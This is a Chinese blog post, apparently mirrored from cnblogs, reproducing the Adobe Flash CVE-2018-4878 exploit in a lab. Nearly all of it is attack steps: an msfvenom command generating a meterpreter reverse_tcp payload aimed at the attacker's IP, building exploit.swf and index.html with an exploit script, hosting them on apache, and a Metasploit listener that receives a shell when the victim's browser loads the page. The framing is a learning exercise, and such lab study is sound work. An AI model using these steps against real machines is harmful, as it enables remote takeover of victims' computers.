# cve-2018-4878 漏洞复现 - lgf01010 - 博客园

> 原文：[`www.cnblogs.com/lgf01010/p/9549792.html`](https://www.cnblogs.com/lgf01010/p/9549792.html)

CVE-2018-4878
Flash 0day 漏洞 1、漏洞概述
2018 年 2 月 1 号，Adobe 官方发布安全通报（APSA18-01），声明 Adobe Flash 28.0.0.137 及其之前的版本，存在高危漏洞（CVE-2018-4878）。
攻击者通过构造特殊的 Flash 链接，当用户用浏览器/邮件/Office 访问此 Flash 链接时，会被“远程代码执行”，并且直接被 getshell。

靶机：Windows7 sp1

条件：Adobe Flash 28.0.0.137 及其之前的版本     IE8 浏览器及以前版本（IE9 好像也行）

所需工具已上传

kali：192.168.43.16

（需要输入的命令均用<>标记出来，<>不需要输入）

准备工作：

kali 中打开终端，找到下载的 cve-2018-4878 工具，切换到该路径（这种工具在未来应该尽量由自己写出来）

![](img/28fe999e4b3486f3eb2b9ca26b6e36fa.png)

<msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.16 LPORT=4444 -f python>shellcode.txt>

生成 shellcode.txt 可以查看 kali 的 shellcode

![](img/da329730a4422102ffbf70af66da8dfa.png)

<cat shellcode.txt>查看 shellcode，并替换 cve-2018-4878 里面原来的 shellcode

![](img/ced54582a1048ef1242fd8ef0a1478a9.png)

打开 cve-2018-4878.py，并根据图中指示修改

![](img/888e13612316552502940719b62131fc.png)

![](img/9da1b1b64a683cccbb62c33cceece1f4.png)

好了，改完之后在 cve-2018-4878（下载的工具文件夹路径中）

<python cve-2018-4878.py>生成要用的 exploit.swf 和 index.html

![](img/06ae883d3b84779dc5547fb3ae0c16c1.png)

<ls>发现已经生成了 exploit.swf 和 index.html 两个文件

现在，我们要开启 apache2 服务，把两个文件复制到 apache web 路径中

<service apache2 start>

<cp index.html /var/www/html/index.html>

<cp exploit.swf /var/www/html/exploit.swf>![](img/6b3c713066b3947691457ccb614039c6.png)

打开 msfconsole

<msfconsole>

![](img/cd0d0ce5bf311b7b54133523f4a2cc38.png)

使用监听模块

<use multi/handler>

加载一枚 payload

<set payload windows/meterpreter/reverse_tcp>

使用

<show options>查看需要设置的参数

![](img/8458bcaf257fa37f61c789758c4334ee.png)

万事具备，

<exploit>

![](img/77950cfaebd3760a1c3badcebe4f53bd.png)

现在，当靶机使用有 cve-2018-4878 漏洞的浏览器和 Adobe Flash 访问 http://192.168.43.16/index.html 时，就会获得靶机 shell

![](img/78d0e4853bb05d897836e5a6f099f689.png)

可以看到，已经反弹 meterpreter 会话，只要输入<shell>就可以拿到 shell

![](img/38151e946abdaed541467dee47c254db.png)

通过此次漏洞复习可以更加深刻的了解到，当我们访问一个网页时，其实是访问的一台电脑的某个文件，如果网页存在 sql 注入，可以通过 sql 注入来登陆网站后台，并通过进一步操作可以获取提供文件的电脑（服务器）的 shell，这个以后再说吧